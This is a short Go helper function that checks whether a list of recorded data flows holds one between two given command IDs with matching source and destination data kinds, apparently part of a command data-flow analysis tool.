func inlineFactsHaveFlow(
	facts Facts,
	fromCommandID int64,
	toCommandID int64,
	from DataKind,
	to DataKind,
) bool {
	for _, candidate := range facts.DataFlows {
		if candidate.FromCommandID == fromCommandID &&
			candidate.ToCommandID == toCommandID &&
			candidate.From == from && candidate.To == to {
			return true
		}
	}
	return false
}
